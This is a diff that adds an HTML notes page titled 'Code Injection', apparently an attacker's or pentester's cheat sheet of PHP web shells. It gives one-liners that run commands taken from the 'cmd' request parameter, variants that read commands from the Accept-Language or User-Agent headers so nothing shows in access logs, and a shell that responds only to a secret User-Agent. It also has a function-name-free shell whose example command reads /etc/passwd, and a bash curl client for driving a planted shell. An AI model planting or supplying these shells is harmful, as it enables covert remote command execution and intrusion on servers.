@@ -1,0 +1,57 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Code Injection</title>
+</head><body>Interesting, if you can inject php, set up a vulnerable variable (cmd in this case) to exploit in browser<br/>
+website.com/vulnpage?cmd=&lt;exec command&gt;<br/>
+<br/>
+	&lt;?php <br/>
+	$cmd = ($_REQUEST[&quot;cmd&quot;]);<br/>
+	$outt = exec($cmd);<br/>
+	echo &quot;&lt;pre&gt;$outt&lt;/pre&gt;&quot;;<br/>
+	?&gt; <br/>
+<br/>
+same as: &lt;?php system($_GET['cmd']); ?&gt;<br/>
+Alternate: <span style="font-family: inherit"><span style="font-size: 10pt">&lt;?php</span></span><span style="font-size: 10pt"><span style="font-family: inherit">echo</span><span style="font-family: inherit">shell_exec($_GET['cmd'].' 2&gt;&amp;1');</span><span style="font-family: inherit">?&gt;</span></span> <ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&lt;?php passthru($_GET['cmd']); ?&gt; </li>
+</ul>
+</li>
+</ul>
+<br/>
+See <a href="../code%20exec%20functions/page.html">PHP &gt; Code Exec Functions</a>for other potential commands to use.<br/>
+<br/>
+<span style="font-size: 10pt"><span style="font-family: inherit">preferred if you want to be noisy: &lt;?php echo shell_exec($_GET['cmd'].' 2&gt;&amp;1'); ?&gt;<br/>
+</span></span><span style="font-size: 10pt"><span style="font-family: inherit">Something more subtle would be:</span></span><br/>
+	&lt;?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?&gt;<span style="font-size: 10pt"><span style="font-family: inherit">	&lt;- nothing in access log! Edit Accept-Language header in web proxy</span></span><br/>
+<span style="font-family: inherit"><span style="font-size: 10pt">	or &lt;?php system($_SERVER['HTTP_USER_AGENT'])?&gt;</span></span><br/>
+<br/>
+Hide your shell from easily being used by other people:<br/>
+&lt;?php if($_SERVER['HTTP_USER_AGENT']==&quot;evil1&quot;){echo passthru($_GET['cmd']);} else{echo &quot; &quot;; ?&gt; <br/>
+<br/>
+<br/>
+No need to put function name in the shell:<br/>
+&lt;?php<br/>
+ // Send a POST request with variable '1' = 'system' and variable '2' = 'cat /etc/passwd'<br/>
+ $_=$_POST['1'];<br/>
+ $__=$_POST['2'];<br/>
+ <br/>
+ //The following will now be equivalent to running -&gt; system('cat /etc/passwd');<br/>
+ $_($__);<br/>
+?&gt;<br/>
+<br/>
+<br/>
+SEC560 has more intricate system() shell<br/>
+<br/>
+Advanced cli execution with python: https://github.com/lnxg33k/webhandler<br/>
+<br/>
+Simple bash script for CLI execution (there are others that are probably a lot better, or make your own)<br/>
+#!/bin/bash<br/>
+URL=&quot;http://x.x.x.x:yyyy/cmd_shell.php&quot;<br/>
+CMD=`echo ${*} | sed s'/ /%20/g'`<br/>
+CMD=`echo ${CMD} | sed s'/&amp;/%26/g'`<br/>
+CMD=`echo ${CMD} | sed s'/&gt;/%3e/g'`<br/>
+echo ${URL}?cmd=${CMD}<br/>
+curl -s ${URL}?cmd=${CMD}<br/>
+echo &quot;&quot;<br/>
+<br/>
+and execute it:<br/>
+./cmd_inj ls -la</body></html>
